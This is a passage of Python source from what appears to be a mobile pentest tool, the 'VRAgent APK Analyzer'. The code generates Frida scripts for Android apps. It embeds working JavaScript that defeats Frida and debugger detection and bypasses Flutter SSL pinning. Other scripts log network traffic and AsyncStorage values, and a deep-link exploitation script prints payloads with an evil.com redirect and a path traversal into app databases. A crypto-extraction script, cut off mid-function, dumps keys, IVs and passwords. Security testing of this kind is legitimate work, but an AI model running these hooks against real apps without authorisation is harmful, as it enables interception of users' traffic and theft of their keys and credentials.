                'libfrida',
                'linjector'
            ];
            
            for (var i = 0; i < fridaPaths.length; i++) {{
                if (path.indexOf(fridaPaths[i]) !== -1) {{
                    console.log('[ANTI-FRIDA] File.exists("' + path + '") - returning false');
                    return false;
                }}
            }}
            return originalExists.call(this);
        }};
        console.log('[*] File.exists() hook installed');
    }} catch (e) {{
        console.log('[-] File.exists hook failed: ' + e);
    }}
    
    // ===== Bypass Running Process Detection =====
    try {{
        var ActivityManager = Java.use('android.app.ActivityManager');
        ActivityManager.getRunningAppProcesses.implementation = function() {{
            var processes = this.getRunningAppProcesses();
            if (processes !== null) {{
                var filtered = Java.use('java.util.ArrayList').$new();
                var iterator = processes.iterator();
                while (iterator.hasNext()) {{
                    var process = iterator.next();
                    var processName = process.processName.value;
                    if (processName.indexOf('frida') === -1 && 
                        processName.indexOf('gadget') === -1 &&
                        processName.indexOf('linjector') === -1) {{
                        filtered.add(process);
                    }} else {{
                        console.log('[ANTI-FRIDA] Hiding process: ' + processName);
                    }}
                }}
                return filtered;
            }}
            return processes;
        }};
        console.log('[*] getRunningAppProcesses() hook installed');
    }} catch (e) {{
        console.log('[-] ActivityManager hook failed: ' + e);
    }}
    
    // ===== Bypass Runtime.exec() Frida Detection =====
    try {{
        var Runtime = Java.use('java.lang.Runtime');
        var ProcessBuilder = Java.use('java.lang.ProcessBuilder');
        
        Runtime.exec.overload('[Ljava.lang.String;').implementation = function(cmdarray) {{
            var cmd = '';
            for (var i = 0; i < cmdarray.length; i++) {{
                cmd += cmdarray[i] + ' ';
            }}
            
            // Block commands that detect Frida
            if (cmd.indexOf('frida') !== -1 || cmd.indexOf('27042') !== -1 || cmd.indexOf('27043') !== -1) {{
                console.log('[ANTI-FRIDA] Blocking exec: ' + cmd);
                // Return empty process
                return this.exec(['echo', '']);
            }}
            
            return this.exec(cmdarray);
        }};
        console.log('[*] Runtime.exec() hook installed');
    }} catch (e) {{
        console.log('[-] Runtime.exec hook failed: ' + e);
    }}
    
    // ===== Bypass Native Library Name Check =====
    try {{
        var System = Java.use('java.lang.System');
        var originalMapLibraryName = System.mapLibraryName;
        System.mapLibraryName.implementation = function(libname) {{
            var result = originalMapLibraryName.call(this, libname);
            console.log('[NATIVE] mapLibraryName("' + libname + '") = ' + result);
            return result;
        }};
    }} catch (e) {{}}
    
    // ===== Bypass /proc/self/fd enumeration =====
    try {{
        var File = Java.use('java.io.File');
        File.listFiles.overload().implementation = function() {{
            var path = this.getAbsolutePath();
            if (path.indexOf('/proc/') !== -1 && path.indexOf('/fd') !== -1) {{
                console.log('[ANTI-FRIDA] listFiles() on ' + path + ' - filtering Frida FDs');
            }}
            return this.listFiles();
        }};
    }} catch (e) {{}}
    
    // ===== Bypass Debug.isDebuggerConnected() =====
    try {{
        var Debug = Java.use('android.os.Debug');
        Debug.isDebuggerConnected.implementation = function() {{
            console.log('[ANTI-FRIDA] Debug.isDebuggerConnected() - returning false');
            return false;
        }};
        console.log('[*] Debug.isDebuggerConnected() hook installed');
    }} catch (e) {{
        console.log('[-] Debug hook failed: ' + e);
    }}
    
    // ===== Bypass TracerPid Check (anti-ptrace) =====
    try {{
        var BufferedReader = Java.use('java.io.BufferedReader');
        BufferedReader.readLine.overload().implementation = function() {{
            var line = this.readLine();
            if (line !== null && line.indexOf('TracerPid') !== -1) {{
                console.log('[ANTI-FRIDA] TracerPid detected, returning TracerPid: 0');
                return 'TracerPid:\\t0';
            }}
            // Also filter frida strings from /proc/maps
            if (line !== null && (line.indexOf('frida') !== -1 || line.indexOf('gadget') !== -1)) {{
                console.log('[ANTI-FRIDA] Filtering line containing frida reference');
                return '';
            }}
            return line;
        }};
        console.log('[*] BufferedReader.readLine() hook installed');
    }} catch (e) {{
        console.log('[-] BufferedReader hook failed: ' + e);
    }}
    
    console.log('\\n[*] Anti-Frida Detection Bypass Complete');
    console.log('[*] This script should prevent most Frida detection mechanisms');
}});
'''
    scripts.append(FridaScript(
        name="Anti-Frida Detection Bypass",
        category="anti_frida_bypass",
        description="Comprehensive bypass for Frida detection mechanisms including port scanning, memory scanning, file checks, and process enumeration",
        script_code=anti_frida_script,
        target_classes=["java.io.File", "android.app.ActivityManager", "android.os.Debug"],
        target_methods=["exists", "getRunningAppProcesses", "isDebuggerConnected", "exec"],
        is_dangerous=True,
        usage_instructions=f"frida -U -f {package_name} -l anti_frida_bypass.js --no-pause (LOAD THIS FIRST!)"
    ))
    
    # =========================================================================
    # Generate Flutter/Dart Hook Script
    # =========================================================================
    flutter_hook_script = f'''// Flutter/Dart VM Hook Script for {package_name}
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f {package_name} -l flutter_hook.js --no-pause

console.log("");
console.log("       Flutter/Dart VM Hook Script                         ");
console.log("       For Flutter-based Android applications              ");
console.log("");

// Detect if this is a Flutter app
var isFlutterApp = false;
var libflutter = null;
var libapp = null;

// Wait for libraries to load
setTimeout(function() {{
    try {{
        libflutter = Process.findModuleByName('libflutter.so');
        libapp = Process.findModuleByName('libapp.so');
        
        if (libflutter) {{
            isFlutterApp = true;
            console.log('[FLUTTER] Detected Flutter app!');
            console.log('  libflutter.so base: ' + libflutter.base);
            console.log('  libflutter.so size: ' + libflutter.size);
        }}
        
        if (libapp) {{
            console.log('  libapp.so base: ' + libapp.base);
            console.log('  libapp.so size: ' + libapp.size);
        }}
    }} catch (e) {{}}
}}, 1000);

// ===== Hook Dart Native Functions =====
function hookDartNative(functionName, description) {{
    try {{
        var addr = Module.findExportByName('libflutter.so', functionName);
        if (!addr) {{
            addr = Module.findExportByName('libapp.so', functionName);
        }}
        
        if (addr) {{
            Interceptor.attach(addr, {{
                onEnter: function(args) {{
                    console.log('[DART] ' + functionName + '()');
                }},
                onLeave: function(retval) {{
                    console.log('[DART] ' + functionName + '() returned');
                }}
            }});
            console.log('[+] Hooked: ' + functionName);
            return true;
        }}
    }} catch (e) {{}}
    return false;
}}

// Hook common Dart VM functions
var dartFunctions = [
    'Dart_Initialize',
    'Dart_CreateIsolateGroup',
    'Dart_EnterScope',
    'Dart_ExitScope',
    'Dart_NewStringFromCString',
    'Dart_StringToCString',
    'Dart_Invoke',
    'Dart_GetField',
    'Dart_SetField',
    'Dart_GetNativeArgument',
    'Dart_SetReturnValue'
];

setTimeout(function() {{
    console.log('\\n[*] Attempting to hook Dart VM functions...');
    dartFunctions.forEach(function(func) {{
        hookDartNative(func, '');
    }});
}}, 2000);

// ===== Flutter SSL Pinning Bypass =====
setTimeout(function() {{
    if (!libflutter) return;
    
    console.log('\\n[*] Applying Flutter SSL Pinning Bypass...');
    
    // Method 1: Hook ssl_crypto_x509_session_verify_cert_chain
    try {{
        var ssl_verify = Module.findExportByName('libflutter.so', 'ssl_crypto_x509_session_verify_cert_chain');
        if (ssl_verify) {{
            Interceptor.attach(ssl_verify, {{
                onLeave: function(retval) {{
                    console.log('[FLUTTER-SSL] ssl_crypto_x509_session_verify_cert_chain() - returning success');
                    retval.replace(1);
                }}
            }});
            console.log('[*] Flutter SSL verify hook installed');
        }}
    }} catch (e) {{}}
    
    // Method 2: Pattern scan for SSL verification
    try {{
        // Search for the BoringSSL verification pattern in libflutter
        var pattern = 'FF C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00';
        Memory.scan(libflutter.base, libflutter.size, pattern, {{
            onMatch: function(address, size) {{
                console.log('[FLUTTER-SSL] Found pattern at: ' + address);
            }},
            onComplete: function() {{}}
        }});
    }} catch (e) {{}}
    
    // Method 3: Hook session_verify_cert_chain via symbol search
    try {{
        var symbols = libflutter.enumerateSymbols();
        symbols.forEach(function(sym) {{
            if (sym.name.indexOf('verify_cert') !== -1 || sym.name.indexOf('ssl_verify') !== -1) {{
                console.log('[FLUTTER-SSL] Found symbol: ' + sym.name + ' @ ' + sym.address);
                Interceptor.attach(sym.address, {{
                    onLeave: function(retval) {{
                        console.log('[FLUTTER-SSL] ' + sym.name + ' bypassed');
                        retval.replace(1);
                    }}
                }});
            }}
        }});
    }} catch (e) {{}}
}}, 3000);

// ===== Flutter HTTP Client Hooks =====
Java.perform(function() {{
    console.log('\\n[*] Installing Flutter/Dart HTTP hooks via Java...');
    
    // Hook Dart HTTP client through Android native
    try {{
        var URL = Java.use('java.net.URL');
        URL.openConnection.overload().implementation = function() {{
            var url = this.toString();
            console.log('[FLUTTER-HTTP] URL.openConnection(): ' + url);
            return this.openConnection();
        }};
        console.log('[*] URL.openConnection() hook installed');
    }} catch (e) {{}}
    
    // Hook OkHttp (Flutter might use it through plugins)
    try {{
        var OkHttpClient = Java.use('okhttp3.OkHttpClient');
        var Builder = Java.use('okhttp3.OkHttpClient$Builder');
        
        Builder.sslSocketFactory.overload('javax.net.ssl.SSLSocketFactory', 'javax.net.ssl.X509TrustManager').implementation = function(factory, trustManager) {{
            console.log('[FLUTTER-HTTP] OkHttp SSL configuration intercepted');
            return this.sslSocketFactory(factory, trustManager);
        }};
        console.log('[*] OkHttp SSL hooks installed');
    }} catch (e) {{}}
}});

// ===== Flutter Platform Channel Hooks =====
Java.perform(function() {{
    console.log('\\n[*] Installing Flutter Platform Channel hooks...');
    
    try {{
        // Hook Flutter Method Channel
        var MethodChannel = Java.use('io.flutter.plugin.common.MethodChannel');
        
        MethodChannel.invokeMethod.overload('java.lang.String', 'java.lang.Object', 'io.flutter.plugin.common.MethodChannel$Result').implementation = function(method, arguments, callback) {{
            console.log('[FLUTTER-CHANNEL] MethodChannel.invokeMethod()');
            console.log('  Method: ' + method);
            if (arguments !== null) {{
                console.log('  Arguments: ' + arguments.toString().substring(0, 200));
            }}
            return this.invokeMethod(method, arguments, callback);
        }};
        console.log('[*] MethodChannel.invokeMethod() hook installed');
    }} catch (e) {{
        console.log('[-] MethodChannel hook failed (might not be Flutter app): ' + e.message);
    }}
    
    try {{
        // Hook Flutter Event Channel
        var EventChannel = Java.use('io.flutter.plugin.common.EventChannel');
        console.log('[*] EventChannel class found');
    }} catch (e) {{}}
    
    try {{
        // Hook Flutter Binary Messenger
        var BinaryMessenger = Java.use('io.flutter.plugin.common.BinaryMessenger');
        console.log('[*] BinaryMessenger class found');
    }} catch (e) {{}}
}});

// ===== Helper Functions =====
global.flutterInfo = function() {{
    console.log('\\n');
    console.log('FLUTTER APP INFO:');
    console.log('  Is Flutter: ' + isFlutterApp);
    if (libflutter) {{
        console.log('  libflutter.so: ' + libflutter.base + ' (' + libflutter.size + ' bytes)');
    }}
    if (libapp) {{
        console.log('  libapp.so: ' + libapp.base + ' (' + libapp.size + ' bytes)');
    }}
    console.log('');
}};

global.flutterExports = function() {{
    if (libflutter) {{
        console.log('\\nlibflutter.so exports (first 50):');
        libflutter.enumerateExports().slice(0, 50).forEach(function(exp) {{
            console.log('  ' + exp.type + ': ' + exp.name);
        }});
    }}
}};

console.log("\\n[*] Helper functions available:");
console.log("  flutterInfo() - Show Flutter app info");
console.log("  flutterExports() - List libflutter.so exports");
console.log("\\n[*] Flutter Hook Script Active");
'''
    scripts.append(FridaScript(
        name="Flutter/Dart VM Hook",
        category="flutter_hook",
        description="Hook Flutter framework, Dart VM, SSL pinning bypass for Flutter, and platform channels",
        script_code=flutter_hook_script,
        target_classes=["io.flutter.plugin.common.MethodChannel", "io.flutter.plugin.common.EventChannel"],
        target_methods=["invokeMethod", "setMethodCallHandler"],
        is_dangerous=False,
        usage_instructions=f"frida -U -f {package_name} -l flutter_hook.js --no-pause"
    ))
    
    # =========================================================================
    # Generate React Native Hook Script
    # =========================================================================
    react_native_hook_script = f'''// React Native Hook Script for {package_name}
// Generated by VRAgent APK Analyzer
// Usage: frida -U -f {package_name} -l react_native_hook.js --no-pause

console.log("");
console.log("       React Native Hook Script                            ");
console.log("       For React Native Android applications               ");
console.log("");

var isReactNativeApp = false;
var libreactnativejni = null;
var libjsc = null;
var libhermes = null;

// Detect React Native
setTimeout(function() {{
    libreactnativejni = Process.findModuleByName('libreactnativejni.so');
    libjsc = Process.findModuleByName('libjsc.so');
    libhermes = Process.findModuleByName('libhermes.so');
    
    if (libreactnativejni || libjsc || libhermes) {{
        isReactNativeApp = true;
        console.log('[RN] Detected React Native app!');
        
        if (libreactnativejni) {{
            console.log('  libreactnativejni.so: ' + libreactnativejni.base);
        }}
        if (libjsc) {{
            console.log('  libjsc.so (JavaScriptCore): ' + libjsc.base);
        }}
        if (libhermes) {{
            console.log('  libhermes.so (Hermes): ' + libhermes.base);
        }}
    }}
}}, 1000);

Java.perform(function() {{
    console.log('\\n[*] Installing React Native hooks...');
    
    // ===== Hook React Native Bridge =====
    try {{
        var CatalystInstanceImpl = Java.use('com.facebook.react.bridge.CatalystInstanceImpl');
        
        // Hook native module calls
        var methods = CatalystInstanceImpl.class.getDeclaredMethods();
        methods.forEach(function(method) {{
            var methodName = method.getName();
            if (methodName.indexOf('callFunction') !== -1 || methodName.indexOf('invoke') !== -1) {{
                console.log('[RN] Found method: ' + methodName);
            }}
        }});
        
        console.log('[*] CatalystInstanceImpl found - React Native confirmed');
    }} catch (e) {{
        console.log('[-] CatalystInstanceImpl not found (might not be RN app)');
    }}
    
    // ===== Hook JavaScript Module Invocations =====
    try {{
        var JavaScriptModule = Java.use('com.facebook.react.bridge.JavaScriptModule');
        console.log('[*] JavaScriptModule class found');
    }} catch (e) {{}}
    
    // ===== Hook Native Module Registry =====
    try {{
        var NativeModuleRegistry = Java.use('com.facebook.react.bridge.NativeModuleRegistry');
        console.log('[*] NativeModuleRegistry class found');
    }} catch (e) {{}}
    
    // ===== Hook React Native Network Module =====
    try {{
        var NetworkingModule = Java.use('com.facebook.react.modules.network.NetworkingModule');
        
        NetworkingModule.sendRequest.implementation = function(method, url, requestId, headers, data, responseType, useIncrementalUpdates, timeout, withCredentials) {{
            console.log('\\n[RN-HTTP] NetworkingModule.sendRequest()');
            console.log('  Method: ' + method);
            console.log('  URL: ' + url);
            console.log('  RequestId: ' + requestId);
            if (headers !== null) {{
                console.log('  Headers: ' + JSON.stringify(headers));
            }}
            if (data !== null) {{
                console.log('  Data: ' + data.toString().substring(0, 500));
            }}
            
            return this.sendRequest(method, url, requestId, headers, data, responseType, useIncrementalUpdates, timeout, withCredentials);
        }};
        console.log('[*] NetworkingModule.sendRequest() hook installed');
    }} catch (e) {{
        console.log('[-] NetworkingModule hook failed: ' + e.message);
    }}
    
    // ===== Hook React Native Storage (AsyncStorage) =====
    try {{
        var AsyncStorageModule = Java.use('com.facebook.react.modules.storage.AsyncStorageModule');
        
        AsyncStorageModule.multiSet.implementation = function(keyValueArray, callback) {{
            console.log('\\n[RN-STORAGE] AsyncStorage.multiSet()');
            if (keyValueArray !== null) {{
                for (var i = 0; i < keyValueArray.size(); i++) {{
                    var kv = keyValueArray.get(i);
                    console.log('  [' + kv.get(0) + ']: ' + kv.get(1).toString().substring(0, 200));
                }}
            }}
            return this.multiSet(keyValueArray, callback);
        }};
        
        AsyncStorageModule.multiGet.implementation = function(keys, callback) {{
            console.log('\\n[RN-STORAGE] AsyncStorage.multiGet()');
            console.log('  Keys: ' + keys.toString());
            return this.multiGet(keys, callback);
        }};
        
        console.log('[*] AsyncStorageModule hooks installed');
    }} catch (e) {{
        console.log('[-] AsyncStorageModule hook failed: ' + e.message);
    }}
    
    // ===== Hook WebSocket Module =====
    try {{
        var WebSocketModule = Java.use('com.facebook.react.modules.websocket.WebSocketModule');
        
        WebSocketModule.connect.implementation = function(url, protocols, options, socketID) {{
            console.log('\\n[RN-WS] WebSocket.connect()');
            console.log('  URL: ' + url);
            console.log('  SocketID: ' + socketID);
            return this.connect(url, protocols, options, socketID);
        }};
        
        WebSocketModule.send.implementation = function(message, socketID) {{
            console.log('[RN-WS] WebSocket.send() [' + socketID + ']: ' + message.substring(0, 500));
            return this.send(message, socketID);
        }};
        
        console.log('[*] WebSocketModule hooks installed');
    }} catch (e) {{
        console.log('[-] WebSocketModule hook failed: ' + e.message);
    }}
    
    // ===== Hook DevSettings (Debug detection) =====
    try {{
        var DevSettingsModule = Java.use('com.facebook.react.devsupport.DevSettingsActivity');
        console.log('[*] DevSettingsModule found - Dev mode may be available');
    }} catch (e) {{}}
    
    // ===== Hook Native Module Call Interceptor =====
    try {{
        var CallInvokerHolder = Java.use('com.facebook.react.turbomodule.core.CallInvokerHolderImpl');
        console.log('[*] TurboModules (CallInvokerHolder) found - New Architecture RN');
    }} catch (e) {{}}
    
    // ===== Hook OkHttp (used by RN networking) =====
    try {{
        var OkHttpClient = Java.use('okhttp3.OkHttpClient');
        var Request = Java.use('okhttp3.Request');
        var Response = Java.use('okhttp3.Response');
        
        var Call = Java.use('okhttp3.Call');
        var RealCall = Java.use('okhttp3.RealCall');
        
        RealCall.execute.implementation = function() {{
            var request = this.request();
            console.log('\\n[RN-HTTP] OkHttp Request');
            console.log('  URL: ' + request.url().toString());
            console.log('  Method: ' + request.method());
            
            var headers = request.headers();
            for (var i = 0; i < headers.size(); i++) {{
                console.log('  Header: ' + headers.name(i) + ': ' + headers.value(i));
            }}
            
            var response = this.execute();
            console.log('[RN-HTTP] Response Code: ' + response.code());
            return response;
        }};
        console.log('[*] OkHttp RealCall.execute() hook installed');
    }} catch (e) {{
        console.log('[-] OkHttp hook failed: ' + e.message);
    }}
}});

// ===== Hermes Engine Hooks (if using Hermes) =====
setTimeout(function() {{
    if (!libhermes) return;
    
    console.log('\\n[*] Installing Hermes engine hooks...');
    
    try {{
        // Hook Hermes evaluate functions
        var hermesExports = libhermes.enumerateExports();
        var evalFunctions = hermesExports.filter(function(exp) {{
            return exp.name.indexOf('eval') !== -1 || exp.name.indexOf('Eval') !== -1;
        }});
        
        evalFunctions.forEach(function(exp) {{
            try {{
                Interceptor.attach(exp.address, {{
                    onEnter: function(args) {{
                        console.log('[HERMES] ' + exp.name + '() called');
                    }}
                }});
                console.log('[+] Hooked: ' + exp.name);
            }} catch (e) {{}}
        }});
    }} catch (e) {{
        console.log('[-] Hermes hooks failed: ' + e);
    }}
}}, 2000);

// ===== JavaScriptCore Hooks (if using JSC) =====
setTimeout(function() {{
    if (!libjsc) return;
    
    console.log('\\n[*] Installing JavaScriptCore hooks...');
    
    try {{
        // Hook JSEvaluateScript
        var JSEvaluateScript = Module.findExportByName('libjsc.so', 'JSEvaluateScript');
        if (JSEvaluateScript) {{
            Interceptor.attach(JSEvaluateScript, {{
                onEnter: function(args) {{
                    console.log('[JSC] JSEvaluateScript() called');
                }}
            }});
            console.log('[*] JSEvaluateScript hook installed');
        }}
    }} catch (e) {{
        console.log('[-] JSC hooks failed: ' + e);
    }}
}}, 2000);

// ===== Helper Functions =====
global.rnInfo = function() {{
    console.log('\\n');
    console.log('REACT NATIVE APP INFO:');
    console.log('  Is React Native: ' + isReactNativeApp);
    console.log('  Engine: ' + (libhermes ? 'Hermes' : (libjsc ? 'JavaScriptCore' : 'Unknown')));
    if (libreactnativejni) {{
        console.log('  libreactnativejni.so: ' + libreactnativejni.base);
    }}
    console.log('');
}};

global.listRNModules = function() {{
    Java.perform(function() {{
        try {{
            var NativeModuleRegistry = Java.use('com.facebook.react.bridge.NativeModuleRegistry');
            console.log('\\nNative Modules registered in React Native');
        }} catch (e) {{}}
    }});
}};

console.log("\\n[*] Helper functions available:");
console.log("  rnInfo() - Show React Native app info");
console.log("  listRNModules() - List registered native modules");
console.log("\\n[*] React Native Hook Script Active");
'''
    scripts.append(FridaScript(
        name="React Native Hook",
        category="react_native_hook",
        description="Hook React Native bridge, JavaScript engine (Hermes/JSC), networking, storage, and WebSocket modules",
        script_code=react_native_hook_script,
        target_classes=["com.facebook.react.bridge.CatalystInstanceImpl", "com.facebook.react.modules.network.NetworkingModule"],
        target_methods=["sendRequest", "multiSet", "connect"],
        is_dangerous=False,
        usage_instructions=f"frida -U -f {package_name} -l react_native_hook.js --no-pause"
    ))
    
    # Build interesting hooks list from analysis
    if dex_analysis and "classes" in dex_analysis:
        for cls in dex_analysis.get("classes", [])[:20]:
            if any(pattern in cls.get("name", "").lower() for pattern in ["crypto", "auth", "login", "key", "token", "password", "secret"]):
                interesting_hooks.append({
                    "class": cls.get("name"),
                    "reason": "Contains sensitive-sounding name",
                    "methods": cls.get("methods", [])[:5]
                })
    
    # Generate suggested test cases
    suggested_tests = [
        "Test SSL pinning bypass by proxying traffic through Burp Suite",
        "Verify root detection bypass on rooted device",
        "Monitor crypto operations during login flow",
        "Trace authentication token generation and storage",
        "Intercept and modify API requests/responses"
    ]
    
    if ssl_pinning_detected:
        suggested_tests.append("SSL pinning detected - test certificate pinning bypass script")
    if root_detection_detected:
        suggested_tests.append("Root detection found - verify root bypass script effectiveness")
    if crypto_methods:
        suggested_tests.append("Cryptographic operations detected - monitor key material with crypto hook")
    if 'biometric' in str(auth_methods_found).lower():
        suggested_tests.append("Biometric auth found - test biometric bypass scenarios")
    
    # Convert scripts to dict format
    scripts_dict = [asdict(s) for s in scripts]
    
    return {
        "package_name": package_name,
        "frida_scripts": scripts_dict,
        "ssl_pinning_detected": ssl_pinning_detected,
        "ssl_patterns_found": list(ssl_classes_found),
        "root_detection_detected": root_detection_detected,
        "root_patterns_found": list(root_classes_found),
        "crypto_methods": crypto_methods[:10],
        "auth_patterns_found": list(auth_methods_found),
        "interesting_hooks": interesting_hooks,
        "suggested_test_cases": suggested_tests,
        "frida_spawn_command": f"frida -U -f {package_name} -l <script.js> --no-pause",
        "frida_attach_command": f"frida -U {package_name} -l <script.js>",
        "total_scripts": len(scripts),
        "emulator_detection_detected": emulator_detection_detected,
        "anti_tampering_detected": anti_tampering_detected,
        "debugger_detection_detected": debugger_detection_detected,
    }


def generate_vulnerability_specific_frida_hooks(
    package_name: str,
    decompiled_findings: List[Dict[str, Any]],
    manifest_analysis: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Generate targeted Frida hooks based on discovered vulnerabilities.
    
    Creates exploitation scripts for:
    - Deep link parameter injection
    - Content provider attacks
    - Crypto key extraction for specific classes
    - WebView exploitation
    - Authentication bypass
    - Kotlin coroutine monitoring
    """
    scripts = []
    
    if not decompiled_findings:
        return {
            "package_name": package_name,
            "vulnerability_scripts": [],
            "total_targeted_hooks": 0,
            "findings_analyzed": 0
        }
    
    # Group findings by scanner/category
    findings_by_scanner = {}
    for f in decompiled_findings:
        scanner = f.get("scanner", "unknown")
        if scanner not in findings_by_scanner:
            findings_by_scanner[scanner] = []
        findings_by_scanner[scanner].append(f)
    
    # =========================================================================
    # Generate Deep Link Exploitation Script
    # =========================================================================
    deep_link_findings = findings_by_scanner.get("deep_link_security", [])
    if deep_link_findings:
        # Extract class names that handle deep links
        deep_link_classes = set()
        for f in deep_link_findings:
            if f.get("class_name"):
                deep_link_classes.add(f["class_name"])
        
        deep_link_hook_script = f'''// Deep Link Exploitation Script for {package_name}
// Generated based on {len(deep_link_findings)} deep link vulnerabilities found
// Usage: frida -U -f {package_name} -l deep_link_exploit.js --no-pause

Java.perform(function() {{
    console.log("");
    console.log("       Deep Link Exploitation Script                        ");
    console.log("       Target Classes: {len(deep_link_classes)} found                               ");
    console.log("");
    
    // ===== Monitor All Intent.getData() Calls =====
    try {{
        var Intent = Java.use('android.content.Intent');
        
        Intent.getData.implementation = function() {{
            var uri = this.getData();
            if (uri !== null) {{
                console.log('\\n[DEEP_LINK] Intent.getData() called');
                console.log('  URI: ' + uri.toString());
                console.log('  Scheme: ' + uri.getScheme());
                console.log('  Host: ' + uri.getHost());
                console.log('  Path: ' + uri.getPath());
                
                // Log all query parameters
                var paramNames = uri.getQueryParameterNames();
                if (paramNames !== null) {{
                    var iter = paramNames.iterator();
                    while (iter.hasNext()) {{
                        var name = iter.next();
                        console.log('  Param[' + name + ']: ' + uri.getQueryParameter(name));
                    }}
                }}
            }}
            return uri;
        }};
        
        Intent.getDataString.implementation = function() {{
            var data = this.getDataString();
            if (data !== null) {{
                console.log('[DEEP_LINK] Intent.getDataString(): ' + data);
            }}
            return data;
        }};
        
        console.log('[*] Intent deep link monitoring installed');
    }} catch (e) {{
        console.log('[-] Intent hooks failed: ' + e);
    }}
    
    // ===== Monitor URI.getQueryParameter() =====
    try {{
        var Uri = Java.use('android.net.Uri');
        
        Uri.getQueryParameter.implementation = function(key) {{
            var value = this.getQueryParameter(key);
            console.log('[DEEP_LINK] Uri.getQueryParameter("' + key + '") = ' + value);
            return value;
        }};
        
        Uri.getLastPathSegment.implementation = function() {{
            var segment = this.getLastPathSegment();
            console.log('[DEEP_LINK] Uri.getLastPathSegment() = ' + segment);
            return segment;
        }};
        
        console.log('[*] URI parameter monitoring installed');
    }} catch (e) {{
        console.log('[-] Uri hooks failed: ' + e);
    }}
    
    // ===== Intercept WebView.loadUrl with Deep Link Data =====
    try {{
        var WebView = Java.use('android.webkit.WebView');
        
        WebView.loadUrl.overload('java.lang.String').implementation = function(url) {{
            console.log('\\n[WEBVIEW] loadUrl() called');
            console.log('  URL: ' + url);
            
            // Check for potentially dangerous URLs
            if (url.startsWith('javascript:') || url.startsWith('file:') || url.startsWith('data:')) {{
                console.log('  [!] DANGEROUS URL SCHEME DETECTED');
            }}
            
            return this.loadUrl(url);
        }};
        
        console.log('[*] WebView URL monitoring installed');
    }} catch (e) {{
        console.log('[-] WebView hooks failed: ' + e);
    }}
    
    // ===== Hook Specific Classes Found in Analysis =====
'''
        # Add hooks for specific classes found
        for cls in list(deep_link_classes)[:5]:  # Limit to 5 classes
            deep_link_hook_script += f'''
    try {{
        var {cls.replace('.', '_')} = Java.use('{cls}');
        console.log('[*] Monitoring class: {cls}');
        // Add specific method hooks here based on analysis
    }} catch (e) {{
        console.log('[-] Could not hook {cls}');
    }}
'''
        
        deep_link_hook_script += '''
    // ===== Deep Link Injection Helper =====
    // Use these test payloads with adb:
    console.log('\\n[*] Test Commands:');
    console.log('  adb shell am start -d "scheme://host/path?param=test"');
    console.log('  adb shell am start -d "scheme://host?redirect=http://evil.com"');
    console.log('  adb shell am start -d "scheme://files?path=../../../data/data/pkg/databases/db"');
    
    console.log("\\n[*] Deep Link Monitoring Active - All URI access will be logged");
});
'''
        scripts.append({
            "name": "Deep Link Exploitation",
            "category": "deep_link_exploit",
            "description": f"Monitor and test {len(deep_link_findings)} deep link vulnerabilities",
            "script_code": deep_link_hook_script,
            "target_classes": list(deep_link_classes),
            "findings_count": len(deep_link_findings),
            "usage_instructions": f"frida -U -f {package_name} -l deep_link_exploit.js --no-pause"
        })
    
    # =========================================================================
    # Generate Crypto Key Extraction Script
    # =========================================================================
    crypto_findings = findings_by_scanner.get("crypto_weakness", [])
    if crypto_findings:
        crypto_classes = set()
        for f in crypto_findings:
            if f.get("class_name"):
                crypto_classes.add(f["class_name"])
        
        crypto_exploit_script = f'''// Crypto Key Extraction Script for {package_name}
// Generated based on {len(crypto_findings)} crypto vulnerabilities found
// Usage: frida -U -f {package_name} -l crypto_extract.js --no-pause

Java.perform(function() {{
    console.log("");
    console.log("       Crypto Key Extraction Script                         ");
    console.log("       Vulnerabilities Found: {len(crypto_findings):<3}                            ");
    console.log("");
    
    var extractedKeys = [];
    var extractedIVs = [];
    
    function bytesToHex(bytes) {{
        if (!bytes) return 'null';
        var hex = '';
        for (var i = 0; i < bytes.length; i++) {{
            var b = (bytes[i] & 0xFF).toString(16);
            hex += (b.length === 1 ? '0' : '') + b;
        }}
        return hex;
    }}
    
    function saveKey(type, algorithm, hex, context) {{
        var entry = {{
            type: type,
            algorithm: algorithm,
            hex: hex,
            context: context,
            timestamp: new Date().toISOString()
        }};
        if (type === 'key') extractedKeys.push(entry);
        if (type === 'iv') extractedIVs.push(entry);
        
        console.log('\\n[EXTRACTED] ' + type.toUpperCase() + ' CAPTURED');
        console.log(JSON.stringify(entry, null, 2));
    }}
    
    // ===== SecretKeySpec - Primary Key Material =====
    try {{
        var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
        SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, algorithm) {{
            var keyHex = bytesToHex(key);
            console.log('\\n[KEY] SecretKeySpec created');
            console.log('  Algorithm: ' + algorithm);
            console.log('  Key (hex): ' + keyHex);
            console.log('  Key length: ' + key.length * 8 + ' bits');
            
            saveKey('key', algorithm, keyHex, 'SecretKeySpec constructor');
            return this.$init(key, algorithm);
        }};
        console.log('[*] SecretKeySpec hooks installed');
    }} catch (e) {{
        console.log('[-] SecretKeySpec hooks failed: ' + e);
    }}
    
    // ===== IvParameterSpec - Initialization Vectors =====
    try {{
        var IvParameterSpec = Java.use('javax.crypto.spec.IvParameterSpec');
        IvParameterSpec.$init.overload('[B').implementation = function(iv) {{
            var ivHex = bytesToHex(iv);
            console.log('\\n[IV] IvParameterSpec created');
            console.log('  IV (hex): ' + ivHex);
            console.log('  IV length: ' + iv.length + ' bytes');
            
            saveKey('iv', 'unknown', ivHex, 'IvParameterSpec constructor');
            return this.$init(iv);
        }};
        console.log('[*] IvParameterSpec hooks installed');
    }} catch (e) {{
        console.log('[-] IvParameterSpec hooks failed: ' + e);
    }}
    
    // ===== PBEKeySpec - Password-Based Keys =====
    try {{
        var PBEKeySpec = Java.use('javax.crypto.spec.PBEKeySpec');
        PBEKeySpec.$init.overload('[C', '[B', 'int', 'int').implementation = function(password, salt, iterations, keyLength) {{
            var pwStr = '';
            for (var i = 0; i < password.length; i++) pwStr += String.fromCharCode(password[i]);
            
            console.log('\\n[PBKDF] PBEKeySpec created');
            console.log('  Password: ' + pwStr);
            console.log('  Salt (hex): ' + bytesToHex(salt));
            console.log('  Iterations: ' + iterations);
            console.log('  Key Length: ' + keyLength + ' bits');
            
            saveKey('pbkdf', 'PBKDF2', 'password=' + pwStr + ',salt=' + bytesToHex(salt) + ',iter=' + iterations, 'PBEKeySpec');
            return this.$init(password, salt, iterations, keyLength);
        }};
        console.log('[*] PBEKeySpec hooks installed');
    }} catch (e) {{
